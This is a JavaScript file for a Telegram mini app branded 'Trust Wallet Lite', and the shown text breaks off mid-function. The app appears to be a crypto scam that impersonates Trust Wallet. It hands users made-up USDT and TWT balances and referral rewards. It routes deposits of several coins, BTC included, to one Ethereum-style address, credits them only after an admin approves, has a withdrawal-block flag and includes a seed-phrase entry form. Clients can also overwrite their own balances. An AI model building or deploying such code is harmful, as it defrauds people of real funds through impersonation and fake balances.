// ============================================================================
// TRUST WALLET LITE - PROFESSIONAL PRODUCTION VERSION
// Fully featured: Wallet, Airdrop, TWT Pay, Swap, Admin Panel, Notifications
// ============================================================================

// ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation?.();
    console.log("✅ Telegram WebApp initialized");
}

// ====== 2. USER IDENTIFICATION (NO GUEST IDS) ======
let REAL_USER_ID = null;
let USER_NAME = 'User';
let USER_USERNAME = '';
let USER_PHOTO = '';

if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
    const user = tg.initDataUnsafe.user;
    if (user.id) {
        REAL_USER_ID = user.id.toString();
        USER_NAME = user.first_name || 'User';
        USER_USERNAME = user.username || '';
        USER_PHOTO = user.photo_url || '';
        console.log("✅ Real Telegram ID detected:", REAL_USER_ID);
    }
}

if (!REAL_USER_ID) {
    document.body.innerHTML = `
        <div style="display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; padding: 20px; background: #0a0b0f; color: white; font-family: sans-serif;">
            <div><div style="font-size: 64px; margin-bottom: 20px;">⚠️</div>
            <h2>Security Error</h2><p>Please open this app from Telegram Mini App.</p>
            <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #0088cc; border: none; border-radius: 8px; color: white;">Retry</button></div>
        </div>
    `;
    throw new Error("No Telegram ID found");
}

const userId = REAL_USER_ID;
const userName = USER_NAME;
localStorage.setItem('twt_user_id', userId);
console.log("📱 User ID:", userId);
console.log("👤 Name:", userName);

// ====== 3. CONSTANTS ======
const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
const AIRDROP_BONUS = 10;
const REFERRAL_BONUS = 25;
const TWT_PRICE = 1.25;
const ADMIN_ID = "1653918641";
const SWAP_RATE = 500000;

// ====== 4. ICONS ======
const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png',
    ADA: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
    DOGE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
    SHIB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5994.png',
    PEPE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/24478.png',
    TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
};

// ====== 5. ALL ASSETS ======
const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' }
];

// ====== 6. REFERRAL MILESTONES ======
const REFERRAL_MILESTONES = [
    { referrals: 10, reward: 50, unit: 'USDT', icon: 'fa-medal' },
    { referrals: 25, reward: 120, unit: 'USDT', icon: 'fa-medal' },
    { referrals: 50, reward: 250, unit: 'USDT', icon: 'fa-crown' },
    { referrals: 100, reward: 500, unit: 'USDT', icon: 'fa-crown' },
    { referrals: 250, reward: 1000, unit: 'USDT', icon: 'fa-gem' }
];

// ====== 7. TOP CRYPTOS ======
const TOP_CRYPTOS = [
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'BNB', name: 'Binance Coin' },
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' }
];

// ====== 8. SWAP CURRENCIES ======
const SWAP_CURRENCIES = [
    { symbol: 'USDT', name: 'Tether', icon: CMC_ICONS.USDT },
    { symbol: 'TWT', name: 'Trust Wallet Token', icon: CMC_ICONS.TWT },
    { symbol: 'BNB', name: 'BNB', icon: CMC_ICONS.BNB },
    { symbol: 'BTC', name: 'Bitcoin', icon: CMC_ICONS.BTC },
    { symbol: 'ETH', name: 'Ethereum', icon: CMC_ICONS.ETH },
    { symbol: 'SOL', name: 'Solana', icon: CMC_ICONS.SOL },
    { symbol: 'TRX', name: 'TRON', icon: CMC_ICONS.TRX },
    { symbol: 'SHIB', name: 'Shiba Inu', icon: CMC_ICONS.SHIB },
    { symbol: 'PEPE', name: 'Pepe', icon: CMC_ICONS.PEPE }
];

// ====== 9. DEPOSIT ADDRESSES ======
const DEPOSIT_ADDRESSES = {
    TWT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    USDT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    BNB: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    BTC: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    ETH: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    SOL: '3DjcSVxfeP3u4WcV9KniMH11btgThnoGxcx54dMtbfuR',
    TRX: 'TMSJH4QunFiUAqZ8iLvQDPajs1v4B3e5E6'
};

const DEPOSIT_MINIMUMS = {
    TWT: 500000, USDT: 10, BNB: 0.02, BTC: 0.0005, ETH: 0.005,
    SHIB: 2000000, PEPE: 3000000, SOL: 0.12, TRX: 40
};

// ====== 10. STATE MANAGEMENT ======
let userData = null;
let livePrices = {};
let currentLanguage = localStorage.getItem('language') || 'en';
let currentTheme = localStorage.getItem('theme') || 'light';
let currentPage = 'wallet';
let isAdmin = userId === ADMIN_ID;
let unreadNotifications = 0;
let swapFromCurrency = 'USDT';
let swapToCurrency = 'TWT';
let currentCurrencySelector = 'from';
let currentHistoryFilter = 'all';
let lastUserLoadTime = 0;
let lastPricesLoadTime = 0;
let lastHistoryCheckTime = 0;
const USER_CACHE_TIME = 300000;
const PRICES_CACHE_TIME = 10800000;
const HISTORY_CACHE_TIME = 600000;

// ====== 11. TRANSLATIONS ======
const translations = {
    en: {
        'nav.wallet': 'Wallet', 'nav.swap': 'Swap', 'nav.airdrop': 'Airdrop',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'Settings',
        'actions.deposit': 'Deposit', 'actions.withdraw': 'Withdraw',
        'actions.send': 'Send', 'actions.receive': 'Receive',
        'actions.history': 'History', 'actions.swap': 'Swap',
        'actions.copy': 'Copy', 'actions.confirm': 'Confirm',
        'wallet.totalBalance': 'Total Balance', 'wallet.myAssets': 'My Assets',
        'swap.from': 'From', 'swap.to': 'To', 'swap.exchangeRate': 'Exchange Rate',
        'swap.networkFee': 'Network Fee', 'swap.confirm': 'Confirm Swap',
        'airdrop.totalInvites': 'Total Invites', 'airdrop.earned': 'USDT Earned',
        'airdrop.yourLink': 'Your Invite Link', 'airdrop.milestones': 'Airdrop Milestones',
        'notifications.title': 'Notifications', 'notifications.clear_read': 'Clear Read',
        'notifications.clear_all': 'Clear All', 'notifications.no_notifications': 'No notifications',
        'settings.language': 'Language', 'settings.theme': 'Theme', 'settings.logout': 'Logout'
    },
    ar: {
        'nav.wallet': 'المحفظة', 'nav.swap': 'تحويل', 'nav.airdrop': 'الإسقاط الجوي',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'الإعدادات',
        'actions.deposit': 'إيداع', 'actions.withdraw': 'سحب',
        'actions.send': 'إرسال', 'actions.receive': 'استلام',
        'actions.history': 'السجل', 'actions.swap': 'تحويل',
        'actions.copy': 'نسخ', 'actions.confirm': 'تأكيد',
        'wallet.totalBalance': 'الرصيد الإجمالي', 'wallet.myAssets': 'أصولي',
        'swap.from': 'من', 'swap.to': 'إلى', 'swap.exchangeRate': 'سعر الصرف',
        'swap.networkFee': 'رسوم الشبكة', 'swap.confirm': 'تأكيد التحويل',
        'airdrop.totalInvites': 'إجمالي الدعوات', 'airdrop.earned': 'USDT المكتسبة',
        'airdrop.yourLink': 'رابط الدعوة', 'airdrop.milestones': 'مراحل الإسقاط',
        'notifications.title': 'الإشعارات', 'notifications.clear_read': 'حذف المقروء',
        'notifications.clear_all': 'حذف الكل', 'notifications.no_notifications': 'لا توجد إشعارات',
        'settings.language': 'اللغة', 'settings.theme': 'المظهر', 'settings.logout': 'تسجيل الخروج'
    }
};

function t(key) { return translations[currentLanguage]?.[key] || translations.en[key] || key; }
function getCurrencyIcon(symbol) { return CMC_ICONS[symbol] || CMC_ICONS.TWT; }
function getCurrencyName(symbol) {
    const names = { TWT: 'Trust Wallet Token', USDT: 'Tether', BNB: 'BNB', BTC: 'Bitcoin', ETH: 'Ethereum', SOL: 'Solana', TRX: 'TRON', SHIB: 'Shiba Inu', PEPE: 'Pepe' };
    return names[symbol] || symbol;
}
function formatBalance(balance, symbol) {
    if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    if (symbol === 'BTC') return balance.toFixed(6) + ' BTC';
    return balance.toFixed(4) + ' ' + symbol;
}
function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
    if (num < 0.0001) return num.toFixed(8);
    if (num < 0.01) return num.toFixed(6);
    return num.toFixed(2);
}
function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    if (!toast) return;
    document.getElementById('toastMessage').textContent = message;
    toast.classList.remove('hidden');
    setTimeout(() => toast.classList.add('hidden'), 3000);
}
function closeModal(modalId) { document.getElementById(modalId)?.classList.remove('show'); }
function copyToClipboard(text) { navigator.clipboard.writeText(text); showToast('Copied!'); }
function animateElement(selector, animation) {
    const el = document.querySelector(selector);
    if (el) { el.classList.add(animation); setTimeout(() => el.classList.remove(animation), 500); }
}

// ====== 12. THEME & LANGUAGE ======
function toggleLanguage() {
    currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
    localStorage.setItem('language', currentLanguage);
    document.getElementById('currentLanguageFlag').textContent = currentLanguage === 'en' ? '🇬🇧' : '🇸🇦';
    if (currentLanguage === 'ar') { document.body.classList.add('rtl'); document.documentElement.dir = 'rtl'; }
    else { document.body.classList.remove('rtl'); document.documentElement.dir = 'ltr'; }
    updateAllTexts();
    showToast('Language changed');
}
function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    localStorage.setItem('theme', currentTheme);
    document.documentElement.setAttribute('data-theme', currentTheme);
}
function initTheme() { document.documentElement.setAttribute('data-theme', currentTheme); }
function updateAllTexts() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        el.textContent = t(el.getAttribute('data-i18n'));
    });
}

// ====== 13. ADMIN SYSTEM ======
function checkAdminAndAddCrown() {
    if (!isAdmin) return;
    const crownBtn = document.getElementById('adminCrownBtn');
    if (crownBtn) crownBtn.classList.remove('hidden');
}
function showAdminPanel() { document.getElementById('adminPanel')?.classList.remove('hidden'); loadAdminData(); }
function closeAdminPanel() { document.getElementById('adminPanel')?.classList.add('hidden'); stopAllListeners(); }
async function loadAdminData() {
    if (!db) return;
    try {
        const [depositsSnapshot, withdrawalsSnapshot] = await Promise.all([
            db.collection('deposit_requests').where('status', '==', 'pending').get(),
            db.collection('withdrawals').where('status', '==', 'pending').get()
        ]);
        document.getElementById('pendingCount').textContent = depositsSnapshot.size + withdrawalsSnapshot.size;
        const adminContent = document.getElementById('adminContent');
        if (adminContent) {
            adminContent.innerHTML = `<div style="text-align:center;padding:30px;"><i class="fa-solid fa-hand-pointer" style="font-size:48px;"></i><p>Click refresh to load requests</p><button onclick="refreshAdminPanel()" class="admin-refresh-btn"><i class="fa-solid fa-rotate-right"></i> Refresh</button></div>`;
        }
    } catch (error) { console.error("Error loading admin data:", error); }
}
async function refreshAdminPanel() {
    if (!isAdmin) return;
    const adminContent = document.getElementById('adminContent');
    if (!adminContent) return;
    adminContent.innerHTML = '<div class="loading-spinner"><i class="fa-solid fa-spinner fa-spin"></i> Loading...</div>';
    try {
        const activeTab = document.querySelector('.admin-tab.active')?.textContent.toLowerCase().includes('deposit') ? 'deposits' : 'withdrawals';
        const collectionName = activeTab === 'deposits' ? 'deposit_requests' : 'withdrawals';
        const snapshot = await db.collection(collectionName).where('status', '==', 'pending').get();
        if (snapshot.empty) { adminContent.innerHTML = '<div class="empty-state">No pending transactions</div>'; return; }
        let html = '';
        snapshot.forEach(doc => {
            const tx = { id: doc.id, ...doc.data() };
            const date = new Date(tx.timestamp);
            html += `<div class="admin-transaction-card"><div class="admin-tx-header"><div class="admin-tx-type ${tx.type}"><i class="fa-regular ${tx.type === 'deposit' ? 'fa-circle-down' : 'fa-circle-up'}"></i><span>${tx.type.toUpperCase()}</span></div><span class="admin-tx-status pending">PENDING</span></div><div class="admin-tx-details"><div class="admin-tx-row"><span class="admin-tx-label">User:</span><span class="admin-tx-value">${tx.userName || tx.userId?.slice(0,8)}</span></div><div class="admin-tx-row"><span class="admin-tx-label">Amount:</span><span class="admin-tx-value">${tx.amount} ${tx.currency}</span></div><div class="admin-tx-row"><span class="admin-tx-label">Time:</span><span class="admin-tx-value">${date.toLocaleDateString()} ${date.toLocaleTimeString()}</span></div></div><div class="admin-tx-actions"><button class="admin-approve-btn" onclick="approveTransaction('${tx.id}', '${tx.userId}', '${tx.type}', '${tx.currency}', ${tx.amount})">Approve</button><button class="admin-reject-btn" onclick="rejectTransaction('${tx.id}', '${tx.userId}', '${tx.type}')">Reject</button></div></div>`;
        });
        adminContent.innerHTML = html;
    } catch (error) { adminContent.innerHTML = '<div class="empty-state">Error loading data</div>'; }
}
async function approveTransaction(firebaseId, targetUserId, type, currency, amount) {
    if (!isAdmin) return;
    try {
        const collectionName = type === 'deposit' ? 'deposit_requests' : 'withdrawals';
        await db.collection(collectionName).doc(firebaseId).update({ status: 'approved', approvedAt: new Date().toISOString() });
        if (type === 'deposit') {
            await db.collection('users').doc(targetUserId).update({ [`balances.${currency}`]: firebase.firestore.FieldValue.increment(amount) });
            if (targetUserId === userId && userData) { userData.balances[currency] = (userData.balances[currency] || 0) + amount; saveUserData(); updateUI(); }
        }
        showToast('Transaction approved!', 'success');
        refreshAdminPanel();
    } catch (error) { showToast('Error approving transaction', 'error'); }
}
async function rejectTransaction(firebaseId, targetUserId, type) {
    if (!isAdmin) return;
    const reason = prompt("Enter rejection reason:");
    if (!reason) return;
    try {
        const collectionName = type === 'deposit' ? 'deposit_requests' : 'withdrawals';
        await db.collection(collectionName).doc(firebaseId).update({ status: 'rejected', reason: reason, rejectedAt: new Date().toISOString() });
        showToast('Transaction rejected', 'success');
        refreshAdminPanel();
    } catch (error) { showToast('Error rejecting transaction', 'error'); }
}
function stopAllListeners() { console.log("Stopping all listeners"); }

// ====== 14. API CALLS ======
async function apiCall(endpoint, method = 'GET', body = null) {
    const options = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) options.body = JSON.stringify(body);
    const response = await fetch(`/api${endpoint}`, options);
    return response.json();
}

// ====== 15. PRICES ======
async function fetchLivePrices(force = false) {
    const now = Date.now();
    const cached = localStorage.getItem('live_prices');
    if (!force && cached && (now - lastPricesLoadTime) < PRICES_CACHE_TIME) {
        const { prices, timestamp } = JSON.parse(cached);
        livePrices = prices;
        lastPricesLoadTime = timestamp;
        if (currentPage === 'wallet') renderAssets();
        updateTotalBalance();
        return;
    }
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=trust-wallet-token,tether,binancecoin,bitcoin,ethereum,solana,tron,shiba-inu,pepe&vs_currencies=usd&include_24hr_change=true');
        const data = await response.json();
        livePrices = {
            TWT: { price: data['trust-wallet-token']?.usd || 1.25, change: data['trust-wallet-token']?.usd_24h_change || 0 },
            USDT: { price: data.tether?.usd || 1, change: data.tether?.usd_24h_change || 0 },
            BNB: { price: data.binancecoin?.usd || 0, change: data.binancecoin?.usd_24h_change || 0 },
            BTC: { price: data.bitcoin?.usd || 0, change: data.bitcoin?.usd_24h_change || 0 },
            ETH: { price: data.ethereum?.usd || 0, change: data.ethereum?.usd_24h_change || 0 },
            SOL: { price: data.solana?.usd || 0, change: data.solana?.usd_24h_change || 0 },
            TRX: { price: data.tron?.usd || 0, change: data.tron?.usd_24h_change || 0 },
            SHIB: { price: data['shiba-inu']?.usd || 0, change: data['shiba-inu']?.usd_24h_change || 0 },
            PEPE: { price: data.pepe?.usd || 0, change: data.pepe?.usd_24h_change || 0 }
        };
        lastPricesLoadTime = now;
        localStorage.setItem('live_prices', JSON.stringify({ prices: livePrices, timestamp: now }));
        if (currentPage === 'wallet') renderAssets();
        updateTotalBalance();
    } catch (error) { console.error("Price fetch error:", error); }
}
function refreshPrices() { fetchLivePrices(true); showToast('Prices refreshed!'); }
function renderTopCryptos() {
    const container = document.getElementById('topCryptoList');
    if (!container) return;
    container.innerHTML = TOP_CRYPTOS.map(crypto => {
        const priceData = livePrices[crypto.symbol] || { price: 0, change: 0 };
        const changeClass = priceData.change >= 0 ? 'positive' : 'negative';
        const changeSymbol = priceData.change >= 0 ? '+' : '';
        return `<div class="crypto-item" onclick="showCryptoDetails('${crypto.symbol}')"><div class="crypto-left"><img src="${getCurrencyIcon(crypto.symbol)}" class="crypto-icon-img"><div class="crypto-info"><h4>${crypto.name}</h4><p>${crypto.symbol}</p></div></div><div class="crypto-right"><div class="crypto-price">$${formatNumber(priceData.price)}</div><div class="crypto-change ${changeClass}">${changeSymbol}${priceData.change.toFixed(2)}%</div></div></div>`;
    }).join('');
}
function showCryptoDetails(symbol) {
    const price = livePrices[symbol]?.price || 0;
    const change = livePrices[symbol]?.change || 0;
    const changeSymbol = change >= 0 ? '+' : '';
    showToast(`${symbol}: $${formatNumber(price)} (${changeSymbol}${change.toFixed(2)}%)`, 'info');
}

// ====== 16. CREATE NEW WALLET ======
async function createNewWallet() {
    console.log("Creating new wallet...");
    const btn = document.getElementById('createWalletBtn');
    if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...'; btn.disabled = true; }
    try {
        const newUserData = {
            userId, userName,
            balances: { TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, SHIB: 0, PEPE: 0 },
            inviteCount: 0, invitedBy: null, totalUsdtEarned: AIRDROP_BONUS,
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [{ id: Date.now().toString(), message: '🎉 Welcome! +10 USDT', read: false, timestamp: new Date().toISOString() }],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date().toISOString() }],
            withdrawBlocked: false, createdAt: new Date().toISOString()
        };
        const response = await apiCall('/users', 'POST', { userId, userData: newUserData });
        if (response.success) {
            userData = newUserData;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
            document.getElementById('onboardingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            updateUI();
            showToast('✅ Wallet created! +10 USDT');
            if (window.startParam && window.startParam !== userId) await processReferral();
        } else throw new Error(response.error);
    } catch (error) { showToast('Failed to create wallet', 'error'); }
    finally { if (btn) { btn.innerHTML = 'Create a new wallet'; btn.disabled = false; } }
}
function showImportModal() {
    const modal = document.getElementById('importModal');
    if (modal) {
        const grid = document.getElementById('wordsGrid');
        if (grid) { grid.innerHTML = ''; for (let i = 1; i <= 12; i++) { grid.innerHTML += `<div class="word-field"><span>${i}</span><input type="text" id="word_${i}" placeholder="word ${i}"></div>`; } }
        modal.classList.add('show');
    } else { showToast('Import feature coming soon', 'info'); }
}
async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) { showToast(`Please enter word ${i}`, 'error'); return; }
        words.push(word);
    }
    showToast('Import feature coming soon', 'info');
}

// ====== 17. PROCESS REFERRAL ======
async function processReferral() {
    const referralCode = window.startParam;
    if (!referralCode || referralCode === userId || userData?.invitedBy) return;
    const response = await apiCall('/referrals', 'POST', { referrerId: referralCode, newUserId: userId });
    if (response.success && userData) {
        userData.invitedBy = referralCode;
        userData.balances.USDT += REFERRAL_BONUS;
        userData.totalUsdtEarned += REFERRAL_BONUS;
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        updateUI();
        showToast(`🎉 +${REFERRAL_BONUS} USDT from referral!`, 'success');
    }
}

// ====== 18. LOAD USER DATA ======
async function loadUserData(force = false) {
    try {
        const now = Date.now();
        const localData = localStorage.getItem(`user_${userId}`);
        if (!force && localData && (now - lastUserLoadTime) < USER_CACHE_TIME) {
            userData = JSON.parse(localData);
            updateUI(); updateNotificationBadge(); checkAdminAndAddCrown();
            document.getElementById('onboardingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            return;
        }
        if (localData) userData = JSON.parse(localData);
        const response = await apiCall(`/users/${userId}`);
        if (response.success && response.data) {
            userData = response.data;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
            updateUI(); updateNotificationBadge(); checkAdminAndAddCrown();
            document.getElementById('onboardingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        } else if (!userData) {
            document.getElementById('onboardingScreen').style.display = 'flex';
            document.getElementById('mainContent').style.display = 'none';
        } else {
            updateUI(); updateNotificationBadge();
            document.getElementById('onboardingScreen').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        }
    } catch (error) {
        document.getElementById('onboardingScreen').style.display = 'flex';
        document.getElementById('mainContent').style.display = 'none';
    }
}
function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        apiCall(`/users/${userId}`, 'PATCH', { updates: userData });
    }
}
function updateNotificationBadge() {
    const badge = document.querySelector('.badge');
    if (badge && userData) {
        const unread = userData.notifications?.filter(n => !n.read).length || 0;
        badge.textContent = unread;
        badge.style.display = unread > 0 ? 'flex' : 'none';
    }
}
function addNotification(message, type = 'info') {
    if (!userData) return;
    if (!userData.notifications) userData.notifications = [];
    userData.notifications.unshift({ id: Date.now().toString(), message, type, read: false, timestamp: new Date().toISOString() });
    saveUserData();
    updateNotificationBadge();
    showToast(message, type);
}
function markNotificationRead(id) {
    const n = userData?.notifications?.find(n => n.id === id);
    if (n && !n.read) { n.read = true; saveUserData(); updateNotificationBadge(); renderNotifications(); }
}
function clearReadNotifications() {
    if (!userData?.notifications) return;
    const readCount = userData.notifications.filter(n => n.read).length;
    if (readCount === 0) { showToast('No read notifications', 'info'); return; }
    userData.notifications = userData.notifications.filter(n => !n.read);
    saveUserData(); updateNotificationBadge(); renderNotifications();
    showToast(`Cleared ${readCount} notifications`);
}
function clearAllNotifications() {
    if (!userData?.notifications) return;
    const unreadCount = userData.notifications.filter(n => !n.read).length;
    if (unreadCount > 0 && !confirm(`Delete ${unreadCount} unread notifications?`)) return;
    userData.notifications = [];
    saveUserData(); updateNotificationBadge(); renderNotifications();
    showToast('All notifications cleared');
}
function renderNotifications() {
    const list = document.getElementById('notificationsList');
    if (!list || !userData) return;
    const notifications = userData.notifications || [];
    if (notifications.length === 0) { list.innerHTML = '<div class="empty-state">No notifications</div>'; return; }
    list.innerHTML = notifications.map(n => `<div class="notification-item ${n.read ? '' : 'unread'}" onclick="markNotificationRead('${n.id}')"><div class="notification-header"><span class="notification-title"><i class="fa-regular fa-bell"></i> Notification</span><span class="notification-time">${new Date(n.timestamp).toLocaleString()}</span></div><div class="notification-message">${n.message}</div></div>`).join('');
}
function showNotifications() {
    const modal = document.getElementById('notificationsModal');
    if (modal) { modal.classList.add('show'); renderNotifications(); }
}
function updateUI() {
    if (currentPage === 'wallet') { renderAssets(); updateTotalBalance(); renderTopCryptos(); }
    if (currentPage === 'airdrop') renderAirdrop();
    if (currentPage === 'settings') renderSettings();
    const userNameEl = document.getElementById('userName');
    const userIdEl = document.getElementById('userIdDisplay');
    const userAvatarEl = document.getElementById('userAvatar');
    if (userNameEl && userData) userNameEl.textContent = userData.userName || userName;
    if (userIdEl && userData) userIdEl.textContent = `ID: ${userData.userId?.slice(-8)}`;
    if (userAvatarEl && userData) userAvatarEl.textContent = (userData.userName || userName).charAt(0).toUpperCase();
}
function updateTotalBalance() {
    if (!userData) return;
    let total = userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * TWT_PRICE;
    total += (userData.balances.BNB || 0) * (livePrices.BNB?.price || 0);
    total += (userData.balances.BTC || 0) * (livePrices.BTC?.price || 0);
    total += (userData.balances.ETH || 0) * (livePrices.ETH?.price || 0);
    const totalEl = document.getElementById('totalBalance');
    if (totalEl) totalEl.textContent = '$' + total.toFixed(2);
}
function logout() { if (confirm('Logout?')) { localStorage.clear(); location.reload(); } }

// ====== 19. RENDER FUNCTIONS ======
function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container || !userData) return;
    container.innerHTML = ALL_ASSETS.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'TWT' ? TWT_PRICE : 0);
        const value = asset.symbol === 'USDT' ? balance : balance * price;
        const change = livePrices[asset.symbol]?.change || 0;
        const changeClass = change >= 0 ? 'positive' : 'negative';
        const changeSymbol = change >= 0 ? '+' : '';
        return `<div class="asset-item" onclick="showAssetDetails('${asset.symbol}')"><div class="asset-left"><img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img"><div class="asset-info"><h4>${asset.name}</h4><p>${asset.symbol} <span class="asset-change ${changeClass}">${changeSymbol}${change.toFixed(2)}%</span></p></div></div><div class="asset-right"><div class="asset-balance">${formatBalance(balance, asset.symbol)}</div><div class="asset-value">$${formatNumber(value)}</div></div></div>`;
    }).join('');
}
function renderWallet() {
    const container = document.getElementById('walletContainer');
    if (!container) return;
    container.innerHTML = `<div class="balance-card"><div class="total-balance" id="totalBalance">$0</div></div><div class="action-buttons"><button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>${t('actions.deposit')}</span></button><button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>${t('actions.withdraw')}</span></button><button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>${t('actions.send')}</span></button><button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>${t('actions.receive')}</span></button><button class="action-btn" onclick="showHistory()"><i class="fas fa-history"></i><span>${t('actions.history')}</span></button></div><div id="assetsList" class="assets-list"></div><div class="section-header"><h3>${t('wallet.topCryptos')}</h3></div><div id="topCryptoList" class="top-crypto-list"></div>`;
    renderAssets(); updateTotalBalance(); renderTopCryptos();
}
function showAssetDetails(symbol) {
    const balance = userData?.balances[symbol] || 0;
    const price = livePrices[symbol]?.price || (symbol === 'TWT' ? TWT_PRICE : 0);
    const value = symbol === 'USDT' ? balance : balance * price;
    showToast(`${symbol}: ${formatBalance(balance, symbol)} ($${formatNumber(value)})`, 'info');
}
function renderAirdrop() {
    const container = document.getElementById('referralContainer');
    if (!container || !userData) return;
    const inviteLink = `${BOT_LINK}?startapp=${userId}`;
    container.innerHTML = `<div class="referral-stats"><div class="stat-card"><span>${t('airdrop.totalInvites')}</span><span>${userData.inviteCount || 0}</span></div><div class="stat-card"><span>${t('airdrop.earned')}</span><span>${(userData.totalUsdtEarned || 0).toFixed(2)}</span></div></div><div class="referral-link-card"><div class="link-label">${t('airdrop.yourLink')}</div><div class="link-container"><input type="text" id="inviteLink" value="${inviteLink}" readonly><button class="copy-btn" onclick="copyInviteLink()"><i class="fas fa-copy"></i></button></div></div><div class="referral-description"><i class="fas fa-gift"></i><p>${t('airdrop.description')} <strong>${REFERRAL_BONUS} USDT</strong> ${t('airdrop.description2')}</p></div><div class="section-header"><h3>${t('airdrop.milestones')}</h3></div><div id="milestonesList" class="milestones-list"></div>`;
    renderAirdropMilestones();
}
function renderAirdropMilestones() {
    const container = document.getElementById('milestonesList');
    if (!container || !userData) return;
    container.innerHTML = REFERRAL_MILESTONES.map(m => {
        const progress = Math.min((userData.inviteCount / m.referrals) * 100, 100);
        const canClaim = userData.inviteCount >= m.referrals && !userData.referralMilestones?.find(x => x.referrals === m.referrals)?.claimed;
        const isClaimed = userData.referralMilestones?.find(x => x.referrals === m.referrals)?.claimed;
        return `<div class="milestone-item"><div class="milestone-header"><span><i class="fas ${m.icon}"></i> ${m.referrals} Referrals</span><span>${m.reward} ${m.unit}</span></div><div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div><div class="progress-text">${userData.inviteCount}/${m.referrals}</div>${canClaim ? `<button class="claim-btn" onclick="claimMilestone(${m.referrals})">Claim Reward</button>` : isClaimed ? '<p style="color:var(--success);text-align:center;">✓ Claimed</p>' : ''}</div>`;
    }).join('');
}
async function claimMilestone(referrals) {
    const milestone = userData.referralMilestones?.find(x => x.referrals === referrals);
    if (!milestone || milestone.claimed) return;
    if (userData.inviteCount < referrals) { showToast(`Need ${referrals} referrals`, 'error'); return; }
    const reward = REFERRAL_MILESTONES.find(x => x.referrals === referrals).reward;
    userData.balances.USDT += reward;
    userData.totalUsdtEarned += reward;
    milestone.claimed = true;
    saveUserData();
    renderAirdrop();
    renderWallet();
    updateTotalBalance();
    showToast(`Claimed ${reward} USDT!`);
}
function copyInviteLink() { copyToClipboard(`${BOT_LINK}?startapp=${userId}`); }
function shareReferral() {
